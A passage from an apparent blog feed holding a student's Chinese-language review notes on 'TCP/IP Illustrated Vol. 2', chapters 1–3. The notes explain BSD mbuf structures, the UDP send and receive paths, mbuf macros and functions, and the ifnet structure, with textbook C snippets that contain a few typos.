src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425013925701.png" alt="image-20230425013925701"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络协议栈CH1-CH3</title>
    <link href="/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/"/>
    <url>/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考教材《TCP&#x2F;IP详解 卷2：实现》，文内示意图大多取自该教材。本文为复习时自行总结，难免存在不全或者错误，求求大伙轻喷。如有问题可以留言在文末评论区，或者直接私聊，我会及时更改文章内容。</p></blockquote><h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><h3 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h3><h4 id="网络输入输出层间框架"><a href="#网络输入输出层间框架" class="headerlink" title="网络输入输出层间框架"></a>网络输入输出层间框架</h4><p>基本框架如下图所示，我们会在后面详细讨论输入输出</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424174856553.png" alt="image-20230424174856553"></p><h4 id="UDP示例socket程序框架"><a href="#UDP示例socket程序框架" class="headerlink" title="UDP示例socket程序框架"></a>UDP示例socket程序框架</h4><blockquote><p>这段C代码也充当后续我们分析输入输出时的例子</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Send a UDP datagram to the daytime server on some other host,</span><br><span class="hljs-comment">* read the reply. and print the time and date on the server .</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFSIZE    150     <span class="hljs-comment">/* arbitrary size */</span></span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serv</span>;</span><br>    <span class="hljs-type">char</span> buff [BUFFSIZE] ;<br>    <span class="hljs-type">int</span> sockfd, n;<br>    <span class="hljs-keyword">if</span> ((sockfd = socket(PF_INET, SOCK_DGRAM,<span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        err_sys (<span class="hljs-string">&quot; socket error&quot;</span>) ;<br>    <br>    bzero((<span class="hljs-type">char</span> *) &amp;serv, <span class="hljs-keyword">sizeof</span> (serv));<br>    <br>    serv.sin_family = AF_INET;<br>    serv.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;140.252.1.32&quot;</span>);<br>    serv.sin_port = htons(<span class="hljs-number">13</span>);<br><br>    <span class="hljs-keyword">if</span> (sendto (sockfd, buff, BUFFSIZE,<span class="hljs-number">0</span>,<br>        (<span class="hljs-keyword">struct</span> sockaddr *) &amp;serv, <span class="hljs-keyword">sizeof</span>(serv)) != BUFFSIZE)<br>    err_sys (<span class="hljs-string">&quot;sendto error&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> ((n = recvfrom(sockfd, buff, BUFFSIZE, <span class="hljs-number">0</span>,<br>        (<span class="hljs-keyword">struct</span> sockaddr *) <span class="hljs-literal">NULL</span>, (<span class="hljs-type">int</span> *) <span class="hljs-literal">NULL</span>))&lt; <span class="hljs-number">2</span>)<br>    err_sys(<span class="hljs-string">&quot;recvfrom error&quot;</span>);<br>    buff[n - <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;        <span class="hljs-comment">/* null terminate */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&amp;s\n&quot;</span>, buff);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="输出流程"><a href="#输出流程" class="headerlink" title="输出流程"></a>输出流程</h3><p>下面考虑插口层调用<code>sendto()</code>函数时发生的流程</p><h4 id="mbuf结构"><a href="#mbuf结构" class="headerlink" title="mbuf结构"></a>mbuf结构</h4><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424135820569.png" alt="用两个mbuf来存储150字节的数据"></p><p>如图是一个含有150字节的mbuf分组。宏观来看，可以发现<code>mbuf</code>是由<code>m_next</code>指针链接的单链表，这种安排方式叫做<strong>mbuf链表</strong>. </p><p>细节来看各个成员变量及其含义：</p><ul><li><code>m_next</code>用来连接下一个<code>mbuf</code></li><li><code>m_nextpkt</code>用来连接下一个<strong>mbuf分组</strong></li><li><code>m_len</code>标识所在的<code>mbuf</code>包含的<strong>data数据长度</strong></li><li><code>m_type</code>标识所在<code>mbuf</code>的类型</li><li><code>m_data</code>指向所在<code>mbuf</code>的<strong>数据开头地址</strong></li><li><code>m_flags</code>用来标识所在<code>mbuf</code>的类型，但不同于<code>m_type</code></li></ul><p>以及两个特殊的成员，共同组成了<strong>mbuf分组首部</strong>，占8个byte。只有当mbuf的<strong>flags为M_PKTHDR</strong>时，才启用：</p><ul><li><code>m_pkthdr.len</code>用来表示整个分组的data长度</li><li><code>m_pkthdr.rcvif</code></li></ul><p>整个mbuf的size为128 byte，除去前面的成员变量和首部的话可以存储100字节的数据，如果不包含mbuf分组首部，则可以存储108字节。</p><h4 id="添加IP和UDP首部"><a href="#添加IP和UDP首部" class="headerlink" title="添加IP和UDP首部"></a>添加IP和UDP首部</h4><p>下图是以一个150字节数据的mbuf，加入IP和UDP首部后的mbuf情况</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424142206955.png" alt="添加IP和UDP首部"></p><p>具体来说，当UDP输出例程被调用时：</p><ol><li>首先讲原有指向150byte的mbuf链表的指针作为参数进行传递</li><li>然后新建一个含有<strong>28字节</strong>IP首部和UDP首部的mbuf</li><li>将新建的mbuf的<code>m_next</code>域指向原有传入的mbuf指针</li><li>将原有8byte的分组首部copy到新的首部</li></ol><blockquote><p>另外需要注意，我们在第4步中将分组首部复制到了新的mbuf中，那么新旧mbuf的<strong>m_flags</strong>域也要进行相应的设置。</p></blockquote><p>于是新的mbuf成为了新的分组首部，且mbuf链表的总长度由2变3，mbuf分组的数据长度增加了28，变成了178byte。可以看到，在<strong>分组首部和IP&#x2F;UDP首部之间存在78字节的空缺</strong>，通过适当的调整<code>m_data</code>和<code>m_len</code>我们可以在其中加入之后的首部，而不需要新建mbuf.</p><p>之后由UDP例程填写UDP首部和IP首部的一部分内容，且UDP检验和计算后也会存储在这里。接着，UDP输出例程调用IP输出例程，并把此mbuf链表的指针传递给IP输出例程。UDP和IP首部剩余的部分由IP输出例程进行填写，如IP校验和等等。</p><h4 id="以太网输出"><a href="#以太网输出" class="headerlink" title="以太网输出"></a>以太网输出</h4><p>在完成上述操作后，IP输出例程调用以太网接口并把mbuf链表继续传递，以太网输出函数流程如下：</p><ol><li>将32为IP地址解析为48位6个字节的以太网地址</li><li>向mbuf首部之前空出来的地方，添加14字节的以太网首部</li><li>将mbuf放入以太网输入输出队列队尾</li></ol><blockquote><p>14字节的以太网首部包含：<strong>6字节的以太网源地址，6字节的以太网目标地址，2字节的以太网帧类型</strong></p></blockquote><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>如下图所示，当进程调用<code>sendto()</code>系统调用时：</p><ol><li>将用户数据拷入mbuf链表</li><li>添加UDP&#x2F;IP首部</li><li>添加以太网首部，随后输出</li></ol><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424145058791.png" alt="image-20230424145058791"></p><h3 id="输入处理"><a href="#输入处理" class="headerlink" title="输入处理"></a>输入处理</h3><blockquote><p>输入处理与刚谈到的输出处理不同，因为输入时异步的。具体来讲，他是通过一个输入完成的中断使以太网设备驱动程序来接受一个输入分组，而不是通过进程的系统调用。内核处理这个设备中断，并调度设备驱动程序进入运行状态。</p></blockquote><h4 id="以太网输入"><a href="#以太网输入" class="headerlink" title="以太网输入"></a>以太网输入</h4><p>假设一个正常的接受已经完成，以太网设备驱动程序会处理这个中断。在下图的这个例子中，我们接收了54个字节的数据，并将其复制到了mbuf当中，其中包括：20字节的IP首部，8字节的UDP首部，26字节的数据</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424151929217.png" alt="image-20230424151929217"></p><p>可以看到其中分配了16字节，但是并没有使用。这个空间是分配给接口层的首部，其他数据存放在剩余的84字节中。</p><p>接着设备驱动程序会根据以太网帧中的类型字段来决定这个分由那个协议层来接收。在这个例子中，将由IP输入例程进行接收。从而mbuf会被加入到IP输入队列当中，另外会产生一个软中断来执行IP输入例程。</p><h4 id="IP输入"><a href="#IP输入" class="headerlink" title="IP输入"></a>IP输入</h4><p>IP输入是异步的，通过软中断来执行。这个软中断由接口层接收到IP数据报时触发。IP处理例程会循环处理IP输入队列上的每一个数据报，并在整个队列完成后返回。IP数据报处理流程包括：</p><ul><li>验证IP首部校验和</li><li>处理IP选项</li><li>验证数据报 被传递到正确的主机（通过比较目的IP地址和主机IP地址）</li><li>转发数据包（当系统为路由器且目的地址为其他IP时）</li><li>如果到达最终目的地址，则会调用下一步输入例程（如TCP、UDP、ICMP及IGMP等）</li></ul><blockquote><p> 在本例中，我们假设下一步输入处理例程为UDP</p></blockquote><h4 id="UDP输入"><a href="#UDP输入" class="headerlink" title="UDP输入"></a>UDP输入</h4><p>UDP输入例程会验证UDP首部中的各字段，然后确定是否一个进程接收次数据报。</p><blockquote><p>一个进程可以接收到指定UDP端口的所有数据报，或让内核根据源与目标IP地址与目标端口号来限制数据报的接收。</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424155315099.png" alt="image-20230424155315099"></p><p>可以看到，原有的mbuf被插入到了一个新的mbuf中。由于我们的数据报需要传给进程，所以这个新的mbuf包含了发送方的IP地址和端口号（从IP首部中拆分出来）。</p><p>另外，如果我们对比图中右侧放置数据的mbuf和以太网输入的mbuf可以发现，<code>m_len</code>和<code>m_pkthdr.len</code> 都减小了28字节(即IP首部和UDP首部的部分)，<code>m_data</code>指向的地址也减小了28，只保留了26字节的data数据。</p><blockquote><p>链表的第一个mbuf的<strong>m_type</strong>类型被设置为了<strong>MT_SONAME</strong>，且这个mbuf是由插口层建立，将这些信息返回给调用系统调用recvfrom和recvmsg的进程中。即便第二个mbuf有空间可以用来存储插口地址结构(发送方IP地址和端口号)，也不能放置在一起。因为两个mbuf的类型并不相同，一个是<strong>MT_SONAME</strong>，一个是<strong>MT_DATA</strong>。</p></blockquote><h4 id="进程输入"><a href="#进程输入" class="headerlink" title="进程输入"></a>进程输入</h4><p>当进程调用<code>recvfrom()</code>时，进程会在内核中保持睡眠状态。现在，内核会唤醒我们的进程，并把mbuf中的数据复制到程序的缓存中。然后释放掉这些mbuf</p><blockquote><p>在调用recvfrom时，我们将第5、6个参数设置为<strong>NULL</strong>，表示我们并不关心发送方的IP地址和UDP端口号，此时recvform只会返回第二个mbuf的data。</p></blockquote><h3 id="中断级别"><a href="#中断级别" class="headerlink" title="中断级别"></a>中断级别</h3><p>如下图所示是8个硬件及软件中断的优先级。划红线的部分为我们之前谈到的两个部分：<strong>splnet(软中断，执行协议层代码)<strong>，</strong>splimp(硬中断执行接口层代码)</strong></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424175810425.png" alt="image-20230424175810425"></p><h2 id="第二章-存储器存储"><a href="#第二章-存储器存储" class="headerlink" title="第二章 存储器存储"></a>第二章 存储器存储</h2><h3 id="mbuf分类"><a href="#mbuf分类" class="headerlink" title="mbuf分类"></a>mbuf分类</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424181654748.png" alt="image-20230424181654748"></p><p>由上图所示，根据mbuf<code>flags</code>域，我们可以将mbuf分为4类：</p><ul><li><strong>flags &#x3D;&#x3D; 0</strong>，只包含data，且data最大为108 byte</li><li><strong>flags &#x3D;&#x3D; M_PKTHDR</strong> ，包含8 byte分组头部， data最大为100 byte</li><li><strong>flags &#x3D;&#x3D; M_EXT</strong>，包含2048byte的额外空间，且数据最少为208byte</li><li><strong>flags &#x3D;&#x3D; M_PKTHDR | M_EXT</strong>，在额外空间的基础上多了分组头部，且数据最小长度为208byte</li></ul><blockquote><p>阴影部分为不使用的部分</p></blockquote><p>可以看到，后两类的muf又多了三种域：</p><ul><li><code>m_ext.ext_buf</code>，指向额外空间的起始地址（m_data指向的是缓存的起始）</li><li><code>m_ext.ext_free</code>，在Net&#x2F;3中不使用</li><li><code>m_ext.ext_size</code>，额外空间的大小，一般为1024或2048，本书以2048为主mub</li></ul><h3 id="简单的mbuf宏和函数"><a href="#简单的mbuf宏和函数" class="headerlink" title="简单的mbuf宏和函数"></a>简单的mbuf宏和函数</h3><h4 id="MGET宏"><a href="#MGET宏" class="headerlink" title="MGET宏"></a>MGET宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MGET(m, how, type) &#123; \</span><br><span class="hljs-meta">MALLOC((m), struct mbuf *, MSIZE, mbtypes [type], (how)); \</span><br><span class="hljs-meta"><span class="hljs-keyword">if</span>(m)&#123;\</span><br><span class="hljs-meta">(m)-&gt;m_type = (type); \</span><br><span class="hljs-meta">MBUFLOCK (mbstat.m_mtypes [type]++;) \</span><br><span class="hljs-meta">(n)-&gt;m_next = (struct mbuf * )NULL; \</span><br><span class="hljs-meta">(m)-&gt;m_nextpkt = (struct mbuf *)NULL; \</span><br><span class="hljs-meta">(m) -&gt;m_data = (m)-&gt;m_dat; \</span><br><span class="hljs-meta">(m)-&gt;m_flags = 0; \</span><br><span class="hljs-meta">&#125; <span class="hljs-keyword">else</span> \</span><br><span class="hljs-meta">(m) = m_retry((how)，(type)); \</span><br></code></pre></td></tr></table></figure><p> 这里就不做源码上详细解释，自己看应该能懂。只稍微说几个点：</p><ul><li><code>MBUFLOCK</code>宏是用来保证执行<code>mbstat.m_mtypes[type]++</code>的优先级，防止+1时被打断</li><li><code>m-&gt;data = m-&gt;dat</code>是让data指向缓存区域的开始地址</li><li>else分支里面是malloc分配失败时的处理</li></ul><blockquote><p>mbstat 是一个用来管理mbuf的全局变量，前面我并没有提到。是因为我觉得这个东西可能不是那么重要，没详细去看😀</p></blockquote><h4 id="m-get函数"><a href="#m-get函数" class="headerlink" title="m_get函数"></a>m_get函数</h4> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> mbuf* <span class="hljs-title function_">m_get</span><span class="hljs-params">(nowait, type)</span><br><span class="hljs-type">int</span> nowait, type;<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>    <br>    MGET(m, nowait, type);<br>    retrun (m);<br>&#125;<br></code></pre></td></tr></table></figure><p>没什么东西，就是MGET宏套了个函数外套。nowait的值为M_WAIT或M_DONTWAIT，取决于在存储器不可用时是否等待。</p><h4 id="m-retry函数"><a href="#m-retry函数" class="headerlink" title="m_retry函数"></a>m_retry函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> mbuf* <span class="hljs-title function_">m_retry</span><span class="hljs-params">(i, t)</span><br><span class="hljs-type">int</span> i, t;<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>    <br>    m_relaim();<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> m_retry(i,t)(struct mbuf *)0</span><br>    MGET(m, nowait, type);<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> m_retry</span><br>    retrun (m);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是MGET宏的else分支执行的函数，通过<code>m_relaim()</code>试图腾出一部分空间，然后再次尝试MGET</p><h4 id="m-devget函数"><a href="#m-devget函数" class="headerlink" title="m_devget函数"></a>m_devget函数</h4><p>当接收到以太网帧时，设备驱动程序调用函数<code>m_devget()</code>创建mbuf来接受数据，根据数据长度不同，会形成四种类型的mbuf链表,如下面所示：</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194426443.png" alt="image-20230424194426443"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194444638.png" alt="image-20230424194444638"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194434240.png" alt="image-20230424194434240"></p><h4 id="mtod和dtom宏"><a href="#mtod和dtom宏" class="headerlink" title="mtod和dtom宏"></a>mtod和dtom宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>mtod(m, t)((t) ((m)-&gt;m_data) )</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>dtom(x)((struct mbuf *) ((int) (x) &amp; ~ (MSIZE-1)))</span><br></code></pre></td></tr></table></figure><p><code>mtod()</code>宏可以直接理解成<strong>mbuf to data</strong>，即返回mbuf中的m_data指针，不过额外做了类型转换</p><p> <code>dtom()</code>可以理解为<strong>data to mbuf</strong>，即通过data指针返回指向mbuf的指针</p><blockquote><p>dtom()实际原理也比较简单，MSIZE为128，那么~(MSIZE-1)其实就是0xffffff80，可以明显看到byte的二进制形式位 1000 0000通过清理低位来找到mbuf的起始地址。由于本书全是32位的系统，所以这里我也用的是32位的地址举例。</p></blockquote><p>知道<code>dtom()</code>的原理，很容易就发现其只适用于不含额外扩容的mbuf结构，此时需要<code>m_pullup</code>处理</p><h4 id="m-pullup"><a href="#m-pullup" class="headerlink" title="m_pullup"></a>m_pullup</h4><h5 id="作用1"><a href="#作用1" class="headerlink" title="作用1"></a>作用1</h5><p>当数据报长度小于协议首部大小时，<code>m_pullup</code>会将前N个字节数据重组在第一个mbuf中，试图恢复正常的协议首部。N为传入参数，但是当mbuf链表上数据总长度小于N时，函数将失效，该数据报会被丢弃。</p><h5 id="作用2"><a href="#作用2" class="headerlink" title="作用2"></a>作用2</h5><p>就是刚刚谈到的<code>dtom()</code>问题，当mbuf中有扩容地址或者说数据在“簇”中存放时，这里<code>m_pullup</code>，将会新建一个mbuf插入链表头，并把簇的前40个byte拷贝近新的mbuf链表头内。</p><blockquote><p>40个字节是因为最大的协议首部为40（20 IP首部+20 TCP首部），这样可以保证在后续传给高层协议处理时，可以正常处理。</p><p>下图2-17为处理前，2-18为处理后。另外需要注意到，处理后的m_data指针指向了簇内去除40byte之后的位置，验证了我们之前谈到的m_data指向的是数据的起始，而不是缓存区域的起始。</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424202823136.png" alt="image-20230424202823136"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424202834314.png" alt="image-20230424202834314"></p><p>另外需要注意，TCP不使用<code>m_pullup()</code>，而是采取另外不同的技术</p><h3 id="联网数据结构小结"><a href="#联网数据结构小结" class="headerlink" title="联网数据结构小结"></a>联网数据结构小结</h3><blockquote><p>个人感觉前面哪些详细分析已经差不多了，这数据结构自己也应该能画出来😝，就放两张图看看就好</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424203817974.png" alt="image-20230424203817974"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424203829722.png" alt="image-20230424203829722"></p><h3 id="m-copy和簇引用计数"><a href="#m-copy和簇引用计数" class="headerlink" title="m_copy和簇引用计数"></a>m_copy和簇引用计数</h3><blockquote><p>这个part是一个比较有趣的部分，但流程相对来说也更复杂一些</p></blockquote><p>这里我们假设一个例子，一个程序想把共4096byte写入到TCP插口当中，且TCP传输的最大报文大小为1460。那么基本流程如下:</p><ol><li>先把前2048个byte放入一个簇内，如下图<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424205327832.png" alt="image-20230424205327832"></li><li>新建一个mbuf作为发送出去的mbuf分组首部（左下），再建一个mbuf与步骤1建立的mbuf共享簇（右下），并设置m_len为1460，表示只取前面1460，如图<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424205805136.png" alt="image-20230424205805136"></li><li>将这1460的数据传输出去，然后释放掉mbuf</li><li>新建一个mbuf（右上）用于存放后2048的byte，同步骤2新建buf链表，不过链表第2个mbuf指向之前未用完的簇后半部分，第三个mbuf指向新的2048<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424210301395.png" alt="image-20230424210301395"></li><li>不断重复类似上述操作，通过共享簇，将所有数据传输出去</li></ol><blockquote><p>簇引用计数用来表示一个簇同时被几个mbuf指向。每当释放一个mbuf，该mbuf所指向的簇的引用计数-1，当且仅当簇的引用计数为0时，簇可以被释放。这是为了防止在共享簇时，上述操作中的释放mbuf可能会导致释放掉共享的簇而导致数据丢失。</p></blockquote><h2 id="第三章-接口层"><a href="#第三章-接口层" class="headerlink" title="第三章 接口层"></a>第三章 接口层</h2><h3 id="ifnet结构"><a href="#ifnet结构" class="headerlink" title="ifnet结构"></a>ifnet结构</h3><p>结构ifnet中包含所有接口的通用信息，每个网络设备拥有独立的ifnet结构。ifnet结构有一个列表，包含这个设备的一个或多个协议地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> *<span class="hljs-title">if_next</span>;</span><span class="hljs-comment">/* a11 struct ifnets are chained */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> *<span class="hljs-title">if_addrlist</span>;</span> <span class="hljs-comment">/* linked list of addresses per if */</span><br>    <span class="hljs-type">char</span> *if_name;<span class="hljs-comment">/* name, e.g. &#x27;le&#x27; or &#x27;lo&#x27; */</span><br>    <span class="hljs-type">short</span> if_unit;<span class="hljs-comment">/* sub-unit for lower level driver */</span><br>    u_short if_index;<span class="hljs-comment">/* numeric abbreviation for this if */</span><br>    <span class="hljs-type">short</span> if_flags ;<span class="hljs-comment">/* Figure 3.7 */</span><br>    <span class="hljs-type">short</span> if_timer ;<span class="hljs-comment">/* time &#x27;ti1 if_watchdog called */</span><br>    <span class="hljs-type">int</span> if_pcount;<span class="hljs-comment">/* number of promiscuous listeners */</span><br>    <span class="hljs-type">caddr_t</span> if_bpf;<span class="hljs-comment">/* packet filter structure */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">if_</span> _<span class="hljs-title">data</span> &#123;</span><br>        <span class="hljs-comment">/* generic interface information */</span><br>        u_char ifi_type;<span class="hljs-comment">/* Figure 3.9 */</span><br>        u_char ifi_addr1en;<span class="hljs-comment">/* media address 1ength */</span><br>        u_char ifi_harlen;<span class="hljs-comment">/* media header length */</span><br>        u_1ong ifi_mtu;<span class="hljs-comment">/* maximum transmission unit */</span><br>        u_long ifi_metric ;<span class="hljs-comment">/* lrouting metric (external on1y) */</span><br>        u_1ong ifi_baudrate;<span class="hljs-comment">/* linespeed */</span><br>        <br>        <span class="hljs-comment">/* other ifner members */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_mtu if_data.ifi_mtu</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_type if_data.ifi_type</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_addrlen if_data.ifi_addrlen</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_hdrlen if_data.ifi_hdrlen</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_metric if_data.ifi_metric</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_baudrate if_data.ifi_baudrate</span><br></code></pre></td></tr></table></figure><blockquote><p>这里每个部分都有注释，就不用我解释了吧😭，困死了要，这些b东西能考什么，哥们也背不下来啊</p></blockquote><ul><li>if_next 将所有ifnet链接为一个单链表</li><li>if_addrlist 指向<code>ifaddr&#123;&#125;</code>结构列表，每个<code>ifaddr&#123;&#125;</code>与一个协议相对应</li><li>if_name 用于标识接口的类型</li><li>if_unit 用于标识多个相同类型的实例</li><li>if_index在内核中唯一表示这个接口</li><li>if_flags表明接口的操作状态和属性</li><li>if_timer以秒为单位记录时间</li><li>if_pcount和if_bpf，支持BSD分组过滤器</li></ul><h3 id="ifaddr结构"><a href="#ifaddr结构" class="headerlink" title="ifaddr结构"></a>ifaddr结构</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424220517917.png" alt="image-20230424220517917"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 